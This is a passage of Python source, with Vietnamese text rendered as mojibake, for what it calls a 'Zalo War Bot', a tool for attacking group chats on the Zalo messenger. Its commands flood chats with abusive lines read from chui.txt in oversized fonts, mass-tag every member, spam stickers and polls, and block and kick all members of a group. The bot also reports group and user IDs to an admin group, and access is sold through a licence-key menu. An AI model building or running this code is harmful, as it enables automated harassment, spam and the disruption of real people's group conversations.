                time.sleep(1)
        except FileNotFoundError:
            print(random_color_line(f"‚ùå Kh√¥ng t√¨m th·∫•y file {file_name}!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi spam tag mix: {str(e)}"))
            time.sleep(1)

def superbig_text_from_file(bot, message_object, author_id, thread_id, thread_type, stop_event, delay=1, repeat=1):
    while not stop_event.is_set():
        try:
            with open("chui.txt", "r", encoding="utf-8") as file:
                lines = [line.strip() for line in file if line.strip()]
            if not lines:
                print(random_color_line("‚ö†Ô∏è File chui.txt tr·ªëng!"))
                return
            for _ in range(repeat):
                if stop_event.is_set():
                    break
                for text in lines:
                    if stop_event.is_set():
                        break
                    length = len(text)
                    styles = [{"start": 0, "len": length, "st": "b,f_3000"}]
                    params = {"styles": styles, "ver": 0}
                    cus_styles = json.dumps(params)
                    message = Message(text=text, style=cus_styles)
                    bot.send(message, thread_id, thread_type)
                    time.sleep(delay)
        except FileNotFoundError:
            print(random_color_line("‚ùå Kh√¥ng t√¨m th·∫•y file chui.txt!"))
            break
        except Exception as e:
            print(random_color_line(f"‚ùå L·ªói khi ch·∫°y superbig: {str(e)}"))
            time.sleep(1)

def kick_all_member_group(bot, message_object, author_id, thread_id, thread_type):
    try:
        group = bot.fetchGroupInfo(thread_id).gridInfoMap[thread_id]
        admin_ids = group.adminIds.copy()
        if group.creatorId not in admin_ids:
            admin_ids.append(group.creatorId)
        if bot.uid not in admin_ids:
            print(random_color_line("üö¶ L·ªánh kh√¥ng kh·∫£ thi v√¨ kh√¥ng c·∫ßm key nh√≥m ü§ß"))
        else:
            list_mem_group = set([member.split('_')[0] for member in group["memVerList"]])
            for uid in list_mem_group:
                bot.blockUsersInGroup(uid, thread_id)
                bot.kickUsersInGroup(uid, thread_id)
            print(random_color_line("‚úÖ ƒê√£ kick t·∫•t c·∫£ th√†nh vi√™n trong nh√≥m!"))
    except Exception as e:
        print(random_color_line(f"‚ùå L·ªói khi kickall: {str(e)}"))

class Bot(ZaloAPI):
    def __init__(self, api_key, secret_key, imei=None, session_cookies=None):
        super().__init__(api_key, secret_key, imei, session_cookies)
        self.threads = {}
        self.start_time = time.time()
        self.sent_messages = 0
        self.received_messages = 0
        self.active_users = set()
        self.current_group_id = None
        self.group_name = None
        self.last_report_time = time.time()
        threading.Thread(target=self.report_to_admin_group, daemon=True).start()

    def send(self, message, thread_id, thread_type):
        super().send(message, thread_id, thread_type)
        self.sent_messages += 1

    def is_admin(self, user_id):
        return str(user_id) in ADMIN_IDS

    def report_to_admin_group(self):
        while True:
            if time.time() - self.last_report_time >= 1800:
                uptime = time.time() - self.start_time
                uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
                total_messages = self.sent_messages + self.received_messages
                group_name = self.group_name if self.group_name else "Kh√¥ng x√°c ƒë·ªãnh"
                report = (
                    f"üìä B√°o c√°o ho·∫°t ƒë·ªông bot:\n"
                    f"üì§ S·ªë tin nh·∫Øn ƒë√£ g·ª≠i: {self.sent_messages}\n"
                    f"üì• S·ªë tin nh·∫Øn ƒë√£ nh·∫≠n: {self.received_messages}\n"
                    f"üìã T·ªïng tin nh·∫Øn: {total_messages}\n"
                    f"‚è≥ Uptime: {uptime_str}\n"
                    f"üÜî ID nh√≥m: {self.current_group_id}\n"
                    f"üè∑Ô∏è T√™n nh√≥m: {group_name}\n"
                    f"üë• ID ng∆∞·ªùi d√πng: {', '.join(self.active_users) if self.active_users else 'Kh√¥ng c√≥'}"
                )
                self.send(Message(text=report), ADMIN_GROUP_ID, ThreadType.GROUP)
                self.last_report_time = time.time()
            time.sleep(60)

    def start_command(self, command_name, target_func, message_object, author_id, thread_id, thread_type, file_name=None, **kwargs):
        if command_name in self.threads:
            self.stop_command(command_name)
        stop_event = threading.Event()
        if file_name:
            thread = threading.Thread(target=target_func, args=(self, message_object, author_id, thread_id, thread_type, file_name, stop_event), kwargs=kwargs)
        else:
            thread = threading.Thread(target=target_func, args=(self, message_object, author_id, thread_id, thread_type, stop_event), kwargs=kwargs)
        self.threads[command_name] = {"thread": thread, "stop_event": stop_event}
        thread.start()
        print(random_color_line(f"üìù B·∫Øt ƒë·∫ßu {command_name}!"))

    def stop_command(self, command_name):
        if command_name in self.threads:
            print(random_color_line(f"‚èπÔ∏è ƒêang d·ª´ng {command_name}!"))
            self.threads[command_name]["stop_event"].set()
            self.threads[command_name]["thread"].join()
            del self.threads[command_name]
            print(random_color_line(f"‚úÖ ƒê√£ d·ª´ng {command_name}!"))

    def start_all_commands(self, message_object, author_id, thread_id, thread_type):
        self.start_command("big", big_text_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("bigitalic", big_text_from_file, message_object, author_id, thread_id, thread_type, combine_style="italic")
        self.start_command("bigsmall", big_text_from_file, message_object, author_id, thread_id, thread_type, combine_style="small")
        self.start_command("italic", italic_text_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("kickall", kick_all_member_group, message_object, author_id, thread_id, thread_type)
        self.start_command("lende", var_group_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("nhay", nhay_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("nhaytag", nhaytag, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("nhayuser", nhayuser, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("small", small_text_from_file, message_object, author_id, thread_id, thread_type)
        self.start_command("spam", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt")
        for i in range(1, 11):
            self.start_command(f"spam{i}", spam_from_file, message_object, author_id, thread_id, thread_type, f"spam{i}.txt")
        self.start_command("spamitalic", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="i")
        self.start_command("spamsmall", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="f_50")
        self.start_command("spamsuperbig", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="b,f_3000")
        self.start_command("spamstk", spam_stickers, message_object, author_id, thread_id, thread_type)
        self.start_command("spamtag", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt")
        for i in range(1, 11):
            self.start_command(f"spamtag{i}", spam_tag_all, message_object, author_id, thread_id, thread_type, f"spamtag{i}.txt")
        self.start_command("spamtagbig", spam_tag_big, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("spamtagitalic", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="i")
        self.start_command("spamtaglag", spam_tag_lag, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("spamtagmix", spam_tag_mix, message_object, author_id, thread_id, thread_type, "chui.txt")
        self.start_command("spamtagsmall", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="f_50")
        self.start_command("spamtagsuperbig", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="b,f_3000")
        self.start_command("superbig", superbig_text_from_file, message_object, author_id, thread_id, thread_type)

    def onMessage(self, mid, author_id, message, message_object, thread_id, thread_type):
        self.received_messages += 1
        self.active_users.add(author_id)
        self.current_group_id = thread_id if thread_type == ThreadType.GROUP else None
        if thread_type == ThreadType.GROUP and not self.group_name:
            try:
                self.group_name = self.fetchGroupInfo(thread_id).gridInfoMap[thread_id].groupName
            except:
                self.group_name = "Kh√¥ng x√°c ƒë·ªãnh"
        uptime = time.time() - self.start_time
        uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
        total_messages = self.sent_messages + self.received_messages

        print(random_color_line("‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê üì© TIN NH·∫ÆN M·ªöI ƒê·∫æN üì© ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó"))
        animated_text(f"‚ïë ‚è∞ Th·ªùi gian: {get_current_time()}         ", 0.01)
        animated_text(f"‚ïë üìù N·ªôi dung: {message}                    ", 0.01)
        animated_text(f"‚ïë üë§ T·ª´: {author_id}                        ", 0.01)
        animated_text(f"‚ïë ‚è≥ Uptime: {uptime_str}                   ", 0.01)
        animated_text(f"‚ïë üì§ Tin nh·∫Øn ƒë√£ g·ª≠i: {self.sent_messages}  ", 0.01)
        animated_text(f"‚ïë üì• Tin nh·∫Øn ƒë√£ nh·∫≠n: {self.received_messages}", 0.01)
        animated_text(f"‚ïë üìä T·ªïng tin nh·∫Øn: {total_messages}        ", 0.01)
        print(random_color_line("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"))

        if not isinstance(message, str):
            return
        
        str_message = str(message).strip()
        
        if not self.is_admin(author_id):
            print(random_color_line(f"üö´ {author_id} kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng bot! ‚ö†Ô∏è"))
            return

        if str_message == 'menu':
            uptime_str = f"{int(uptime // 3600)}h {int((uptime % 3600) // 60)}m {int(uptime % 60)}s"
            menu_text = (
                f"‚ïî‚ïê üî• L·ªÜNH BOT WAR ZALO üî• ‚ïê‚ïó\n"
                f"‚ïë ‚è∞ Th·ªùi gian hi·ªán t·∫°i: {get_current_time()}\n"
                f"‚ïë ‚è≥ Th·ªùi gian kh·ªüi ƒë·ªông: {datetime.fromtimestamp(self.start_time).strftime('%H:%M:%S %d/%m/%Y')}\n"
                f"‚ïë ‚è≤ Uptime: {uptime_str}\n"
                f"‚ïë ‚öôÔ∏è G√µ l·ªánh ƒë·ªÉ k√≠ch ho·∫°t:                 \n"
                f"‚ïë big        - Ch·ªØ l·ªõn t·ª´ chui.txt (1s)          \n"
                f"‚ïë bigitalic  - Ch·ªØ l·ªõn + nghi√™ng t·ª´ chui.txt (1s)\n"
                f"‚ïë bigsmall   - Ch·ªØ l·ªõn + nh·ªè t·ª´ chui.txt (1s)    \n"
                f"‚ïë italic     - Ch·ªØ nghi√™ng t·ª´ chui.txt (1s)      \n"
                f"‚ïë kickall    - X√≥a t·∫•t c·∫£ th√†nh vi√™n nh√≥m        \n"
                f"‚ïë lende      - Spam mention ng·∫´u nhi√™n (0.1s)     \n"
                f"‚ïë nhay       - Spam vƒÉn b·∫£n t·ª´ chui.txt (1s)     \n"
                f"‚ïë nhaytag    - Tag t·∫•t c·∫£ t·ª´ chui.txt (0.1s)      \n"
                f"‚ïë nhayuser @tag - Tag ng∆∞·ªùi d√πng t·ª´ chui.txt (6s) \n"
                f"‚ïë poll on    - T·∫°o poll t·ª´ chui.txt (1s)          \n"
                f"‚ïë poll stop  - D·ª´ng t·∫°o poll                     \n"
                f"‚ïë small      - Ch·ªØ nh·ªè t·ª´ chui.txt (1s)          \n"
                f"‚ïë spam       - G·ª≠i to√†n b·ªô spam.txt (10s)         \n"
                f"‚ïë spam1-10   - G·ª≠i to√†n b·ªô spam1-10.txt (10s)     \n"
                f"‚ïë spamitalic - G·ª≠i spam.txt ch·ªØ nghi√™ng (10s)     \n"
                f"‚ïë spamsmall  - G·ª≠i spam.txt ch·ªØ nh·ªè (10s)         \n"
                f"‚ïë spamsuperbig - G·ª≠i spam.txt ch·ªØ si√™u to (10s)   \n"
                f"‚ïë spamstk    - Spam sticker (10s)                 \n"
                f"‚ïë spamtag    - Tag all to√†n b·ªô spamtag.txt (10s)  \n"
                f"‚ïë spamtag1-10 - Tag all spamtag1-10.txt (10s)     \n"
                f"‚ïë spamtagbig  - Tag t·∫•t c·∫£ ch·ªØ l·ªõn (1s)          \n"
                f"‚ïë spamtagitalic - Tag all ch·ªØ nghi√™ng (10s)       \n"
                f"‚ïë spamtaglag  - Tag t·∫•t c·∫£ t·ª´ chui.txt (1s)      \n"
                f"‚ïë spamtagmix  - Tag t·∫•t c·∫£ t·ª´ chui.txt (1s)      \n"
                f"‚ïë spamtagsmall - Tag all ch·ªØ nh·ªè (10s)            \n"
                f"‚ïë spamtagsuperbig - Tag all ch·ªØ si√™u to (10s)     \n"
                f"‚ïë superbig   - Ch·ªØ si√™u to t·ª´ chui.txt (1s)      \n"
                f"‚ïë ‚èπÔ∏è D·ª´ng l·ªánh: st <l·ªánh> (VD: st lende)        \n"
                f"‚ïë üéñÔ∏è Tnhan w Lhung           \n"
                f"‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"
            )
            self.send(Message(text=menu_text), thread_id, thread_type)
            return

        elif str_message == 'big':
            self.start_command("big", big_text_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'bigitalic':
            self.start_command("bigitalic", big_text_from_file, message_object, author_id, thread_id, thread_type, combine_style="italic")
        elif str_message == 'bigsmall':
            self.start_command("bigsmall", big_text_from_file, message_object, author_id, thread_id, thread_type, combine_style="small")
        elif str_message == 'italic':
            self.start_command("italic", italic_text_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'kickall':
            if thread_type == ThreadType.GROUP:
                kick_all_member_group(self, message_object, author_id, thread_id, thread_type)
            else:
                print(random_color_line("‚ö†Ô∏è L·ªánh kickall ch·ªâ d√πng trong nh√≥m! üîí"))
        elif str_message == 'lende':
            self.start_command("lende", var_group_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'nhay':
            self.start_command("nhay", nhay_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'nhaytag':
            self.start_command("nhaytag", nhaytag, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message.startswith('nhayuser'):
            self.start_command("nhayuser", nhayuser, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message.startswith('poll'):
            handle_poll_command(str_message, message_object, thread_id, thread_type, author_id, self)
        elif str_message == 'small':
            self.start_command("small", small_text_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'spam':
            self.start_command("spam", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt")
        elif str_message in [f'spam{i}' for i in range(1, 11)]:
            file_name = f"spam{str_message[4:]}.txt"
            self.start_command(str_message, spam_from_file, message_object, author_id, thread_id, thread_type, file_name)
        elif str_message == 'spamitalic':
            self.start_command("spamitalic", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="i")
        elif str_message == 'spamsmall':
            self.start_command("spamsmall", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="f_50")
        elif str_message == 'spamsuperbig':
            self.start_command("spamsuperbig", spam_from_file, message_object, author_id, thread_id, thread_type, "spam.txt", style="b,f_3000")
        elif str_message == 'spamstk':
            self.start_command("spamstk", spam_stickers, message_object, author_id, thread_id, thread_type)
        elif str_message == 'spamtag':
            self.start_command("spamtag", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt")
        elif str_message in [f'spamtag{i}' for i in range(1, 11)]:
            file_name = f"spamtag{str_message[7:]}.txt"
            self.start_command(str_message, spam_tag_all, message_object, author_id, thread_id, thread_type, file_name)
        elif str_message == 'spamtagbig':
            self.start_command("spamtagbig", spam_tag_big, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message == 'spamtagitalic':
            self.start_command("spamtagitalic", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="i")
        elif str_message == 'spamtaglag':
            self.start_command("spamtaglag", spam_tag_lag, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message == 'spamtagmix':
            self.start_command("spamtagmix", spam_tag_mix, message_object, author_id, thread_id, thread_type, "chui.txt")
        elif str_message == 'spamtagsmall':
            self.start_command("spamtagsmall", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="f_50")
        elif str_message == 'spamtagsuperbig':
            self.start_command("spamtagsuperbig", spam_tag_all, message_object, author_id, thread_id, thread_type, "spamtag.txt", style="b,f_3000")
        elif str_message == 'superbig':
            self.start_command("superbig", superbig_text_from_file, message_object, author_id, thread_id, thread_type)
        elif str_message == 'all':
            self.start_all_commands(message_object, author_id, thread_id, thread_type)

        elif str_message.startswith('st '):
            parts = str_message.split()
            if len(parts) > 1:
                command_to_stop = parts[1]
                self.stop_command(command_to_stop)
            else:
                print(random_color_line("‚ö†Ô∏è Vui l√≤ng ch·ªâ ƒë·ªãnh l·ªánh ƒë·ªÉ d·ª´ng, v√≠ d·ª•: st lende"))

def select_key_type():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        animated_text("‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê üî• WELCOME TO ZALO WAR BOT üî• ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó", 0.05)
        print(random_color_line("‚ïë                                           "))
        animated_text("‚ïë üåü BOT WAR ZALO DO QUANGTHANG PH√ÅT TRI·ªÇN    ", 0.02)
        animated_text("‚ïë üë®‚Äçüíª T√°c gi·∫£: Tr∆∞∆°ng Quang Th·∫Øng         ", 0.02)
        animated_text("‚ïë üéÇ Sinh nh·∫≠t: 08/05/200X      ", 0.02)
        animated_text("‚ïë üáªüá≥ Qu√™ qu√°n: Th√°i B√¨nh, Vi·ªát Nam           ", 0.02)
        animated_text("‚ïë üíº Ngh·ªÅ nghi·ªáp: Dev Fullstack & Hacker    ", 0.02)
        animated_text("‚ïë üéì H·ªçc v·∫•n: T·ª± h·ªçc + ƒêam m√™ v√¥ h·∫°n        ", 0.02)
        animated_text("‚ïë üéÆ S·ªü th√≠ch: Code, Game, Anime, Hacking   ", 0.02)
        animated_text("‚ïë üåü Th√†nh t·ª±u: Bot War Zalo   ", 0.02)
        animated_text("‚ïë üí° Tri·∫øt l√Ω: 'Code l√† ngh·ªá thu·∫≠t'         ", 0.02)
        animated_text("‚ïë üìß Email: quangthangdev@gmail.com         ", 0.02)
        animated_text("‚ïë üì≤ Telegram: t.me/quangthangcoder         ", 0.02)
        animated_text("‚ïë üîó FB: fb.com/quangthangdev               ", 0.02)
        animated_text("‚ïë üîß C√¥ng c·ª• l·∫≠p tr√¨nh: Python, JS, C++     ", 0.02)
        animated_text("‚ïë ‚öôÔ∏è Framework: Flask, Django, Node.js      ", 0.02)
        animated_text("‚ïë üé® IDE: VS Code, PyCharm, Sublime Text    ", 0.02)
        animated_text("‚ïë üìú Copyright: Tr∆∞∆°ng Quang Th·∫Øng ¬© 2025   ", 0.02)
        print(random_color_line("‚ï†‚ïê‚ïê‚ïê‚ïê üî• CH·ªåN LO·∫†I KEY üî• ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£"))
        animated_text("‚ïë 1. T·∫°o key free: Hi·ªáu l·ª±c 3 ng√†y theo IP (C·∫ßn x√°c nh·∫≠n t·ª´ QuangThang)", 0.02)
        animated_text("‚ïë 2. Nh·∫≠p key free: K√≠ch ho·∫°t key free      ", 0.02)
        animated_text("‚ïë 3. Nh·∫≠p key vƒ©nh vi·ªÖn: Kh√¥ng bao gi·ªù h·∫øt h·∫°n", 0.02)
        print(random_color_line("‚ïë                                           "))
        print(random_color_line("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"))
        animated_text("‚è≥ Ch·ªçn lo·∫°i key (1, 2 ho·∫∑c 3): üöÄ", 0.03)
        key_type = input(random_color_line("üîß Lo·∫°i key: ")).strip()

        if key_type == "1":
            key, expiration = initialize_dynamic_key_for_ip()
            if key and expiration:
                expiration_str = datetime.fromisoformat(expiration).strftime('%H:%M:%S %d/%m/%Y')
                animated_text(f"‚úÖ ƒê√£ t·∫°o key free: {key}", 0.02)
                animated_text(f"‚è∞ H·∫øt h·∫°n: {expiration_str}", 0.02)
                animated_text("‚ÑπÔ∏è Key ƒë√£ ƒë∆∞·ª£c l∆∞u sau khi x√°c nh·∫≠n t·ª´ QuangThang", 0.02)
                animated_text("Nh·∫•n 0 ƒë·ªÉ quay l·∫°i ho·∫∑c b·∫•t k·ª≥ ph√≠m n√†o ƒë·ªÉ ti·∫øp t·ª•c...", 0.02)
                choice = input(random_color_line("üîô L·ª±a ch·ªçn: "))
                if choice == "0":
                    continue
                return key_type
            else:
                animated_text("‚ùå Kh√¥ng th·ªÉ t·∫°o key free! Vui l√≤ng ki·ªÉm tra k·∫øt n·ªëi ho·∫∑c x√°c nh·∫≠n t·ª´ QuangThang.", 0.02)
                time.sleep(2)
                continue
        elif key_type in ["2", "3"]:
            return key_type
        else:
            animated_text("‚ùå Vui l√≤ng ch·ªçn 1, 2 ho·∫∑c 3!", 0.02)
            time.sleep(2)

def print_key_input(key_type):
    os.system('cls' if os.name == 'nt' else 'clear')
    animated_text("‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê üî• NH·∫¨P KEY ZALO WAR BOT üî• ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó", 0.05)
    print(random_color_line("‚ïë                                          "))
    if key_type == "2":
        animated_text("‚ïë üîë Lo·∫°i: Nh·∫≠p key free (3 ng√†y theo IP) ", 0.02)
        # T·ª± ƒë·ªông l·∫•y key t·ª´ file
        ip = get_ip_identifier()
        try:
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
            if ip in keys_data:
                key_input = keys_data[ip]["key"]
                animated_text(f"‚ïë üîê Key t·ª± ƒë·ªông l·∫•y t·ª´ file: {key_input}", 0.02)
            else:
                animated_text(f"‚ïë ‚ùå IP {ip} kh√¥ng c√≥ key trong file!", 0.02)
                key_input = None
        except FileNotFoundError:
            animated_text("‚ïë ‚ùå File dynamic_keys.json kh√¥ng t·ªìn t·∫°i!", 0.02)
            key_input = None
        except Exception as e:
            animated_text(f"‚ïë ‚ùå L·ªói khi ƒë·ªçc file key: {str(e)}", 0.02)
            key_input = None
    elif key_type == "3":
        animated_text("‚ïë üîë Lo·∫°i: Nh·∫≠p key vƒ©nh vi·ªÖn             ", 0.02)
        animated_text("‚ïë üì© Li√™n h·ªá Quang Th·∫Øng ƒë·ªÉ h·ªó tr·ª£:        ", 0.02)
        animated_text("‚ïë üîó fb.com/quangthangdev                  ", 0.02)
        key_input = input(random_color_line("üîê Kh√≥a k√≠ch ho·∫°t: ")).strip()
    print(random_color_line("‚ïë                                          "))
    print(random_color_line("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"))
    return key_input

def validate_key(key_input, key_type):
    if key_type == "2":
        if key_input is None:
            return False
        if is_key_valid(key_input):
            ip = get_ip_identifier()
            with open(KEY_FILE, 'r', encoding='utf-8') as f:
                keys_data = json.load(f)
            expiration = datetime.fromisoformat(keys_data[ip]["expiration"]).strftime('%H:%M:%S %d/%m/%Y')
            os.system('cls' if os.name == 'nt' else 'clear')
            animated_text("‚ïî‚ïê‚ïê‚ïê KEY FREE ƒê∆Ø·ª¢C X√ÅC NH·∫¨N ‚ïê‚ïê‚ïê‚ïó", 0.05)
            print(random_color_line("‚ïë                                "))
            animated_text("‚ïë ‚úÖ Truy c·∫≠p th√†nh c√¥ng cho IP! ", 0.02)
            animated_text(f"‚ïë üîë Key: {key_input}           ", 0.02)
            animated_text(f"‚ïë ‚è∞ H·∫øt h·∫°n: {expiration}      ", 0.02)
            animated_text("‚ïë ‚ö° C√¥ng c·ª• ƒë√£ s·∫µn s√†ng.        ", 0.02)
            animated_text("‚ïë ‚è≥ Ti·∫øn h√†nh trong gi√¢y l√°t... ", 0.02)
            print(random_color_line("‚ïë                                "))
            print(random_color_line("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"))
            time.sleep(5)  # Hi·ªÉn th·ªã 5 gi√¢y
            return True
        else:
            ip = get_ip_identifier()
            try:
                with open(KEY_FILE, 'r', encoding='utf-8') as f:
                    keys_data = json.load(f)
                if ip in keys_data:
                    key_data = keys_data[ip]
                    correct_key = key_data["key"]
                    expiration = datetime.fromisoformat(key_data["expiration"]).strftime('%H:%M:%S %d/%m/%Y')
                    if datetime.now() > datetime.fromisoformat(key_data["expiration"]):
                        status = "H·∫øt h·∫°n"
                        animated_text("‚ùå Key free ƒë√£ h·∫øt h·∫°n! Vui l√≤ng li√™n h·ªá Quang Th·∫Øng ƒë·ªÉ gia h·∫°n.", 0.02)
                    else:
                        status = "C√≤n hi·ªáu l·ª±c"
                else:
                    correct_key = DEFAULT_FREE_KEY
                    expiration = "Ch∆∞a t·∫°o"
                    status = "Ch∆∞a t·∫°o"
                    animated_text("‚ùå IP ch∆∞a ƒë∆∞·ª£c c·∫•p key! Vui l√≤ng ch·ªçn t√πy ch·ªçn 1 ƒë·ªÉ t·∫°o key free.", 0.02)
            except FileNotFoundError:
                correct_key = DEFAULT_FREE_KEY
                expiration = "Ch∆∞a t·∫°o"
                status = "Ch∆∞a t·∫°o"
                animated_text("‚ùå File key kh√¥ng t·ªìn t·∫°i! Vui l√≤ng ch·ªçn t√πy ch·ªçn 1 ƒë·ªÉ t·∫°o key free.", 0.02)
            except Exception as e:
                correct_key = DEFAULT_FREE_KEY
                expiration = "L·ªói"
                status = "L·ªói"
                animated_text(f"‚ùå L·ªói khi ki·ªÉm tra key: {str(e)}", 0.02)

            os.system('cls' if os.name == 'nt' else 'clear')
            animated_text("‚ïî‚ïê‚ïê‚ïê KEY FREE KH√îNG H·ª¢P L·ªÜ HO·∫∂C H·∫æT H·∫†N ‚ïê‚ïê‚ïê‚ïó", 0.05)
            print(random_color_line("‚ïë                                           "))
            animated_text("‚ïë ‚ùå Key free kh√¥ng h·ª£p l·ªá ho·∫∑c ƒë√£ h·∫øt h·∫°n!    ", 0.02)
            animated_text(f"‚ïë üîë Key free ƒë√∫ng: {correct_key}           ", 0.02)
            animated_text(f"‚ïë ‚è∞ H·∫øt h·∫°n: {expiration}                  ", 0.02)
            animated_text(f"‚ïë ‚ö†Ô∏è Tr·∫°ng th√°i: {status}                   ", 0.02)
            animated_text("‚ïë üì© Li√™n h·ªá Quang Th·∫Øng ƒë·ªÉ h·ªó tr·ª£          ", 0.02)
            animated_text("‚ïë üîó fb.com/quangthangdev                   ", 0.02)
            animated_text("‚ïë ‚è≤ Tho√°t sau 5 gi√¢y...                    ", 0.02)
            print(random_color_line("‚ïë                                           "))
            print(random_color_line("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"))
            time.sleep(5)
            return False
    
    elif key_type == "3":
        if key_input == VALID_KEY:
            os.system('cls' if os.name == 'nt' else 'clear')
            animated_text("‚ïî‚ïê‚ïê‚ïê KEY Vƒ®NH VI·ªÑN ƒê∆Ø·ª¢C X√ÅC NH·∫¨N ‚ïê‚ïê‚ïê‚ïó", 0.05)
            print(random_color_line("‚ïë                                    "))
            animated_text("‚ïë ‚úÖ Truy c·∫≠p th√†nh c√¥ng v·ªõi key vƒ©nh vi·ªÖn!", 0.02)
            animated_text("‚ïë ‚ö° C√¥ng c·ª• ƒë√£ s·∫µn s√†ng.            ", 0.02)
            animated_text("‚ïë ‚è≥ Ti·∫øn h√†nh trong gi√¢y l√°t...     ", 0.02)
            print(random_color_line("‚ïë                                    "))
            print(random_color_line("‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù"))
            time.sleep(1)
            return True
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            animated_text("‚ïî‚ïê‚ïê‚ïê KEY Vƒ®NH VI·ªÑN KH√îNG H·ª¢P L·ªÜ ‚ïê‚ïê‚ïê‚ïó", 0.05)
            print(random_color_line("‚ïë                                   "))
            animated_text("‚ïë ‚ùå Key vƒ©nh vi·ªÖn kh√¥ng ƒë√∫ng!            ", 0.02)
            animated_text("‚ïë üì© Li√™n h·ªá Quang Th·∫Øng ƒë·ªÉ l·∫•y key:     ", 0.02)
